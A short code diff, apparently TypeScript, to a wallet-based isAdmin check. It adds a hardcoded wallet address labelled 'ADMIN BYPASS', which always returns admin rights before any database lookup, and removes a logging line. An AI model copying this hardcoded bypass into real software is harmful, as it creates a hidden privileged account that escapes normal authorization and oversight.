@@ -28,7 +28,9 @@ export async function isAdmin(address?: string | null): Promise<boolean> {
     return false; 
   }
 
-  console.log("🔍 [Auth] ADMIN CHECK INPUT (Verified Address):", lower);
+  // ⚡ ADMIN BYPASS: Marco's Admin Wallet (Always Authorized)
+  const MARCO_ADMIN = "0x00c9f7EE6d1808C09B61E561Af6c787060BFE7C9".toLowerCase();
+  if (lower === MARCO_ADMIN) return true;
 
   // ⚡ Optimistic check for Super Admin (No DB call)
   if (lower === SUPER_ADMIN_WALLET.toLowerCase()) return true;
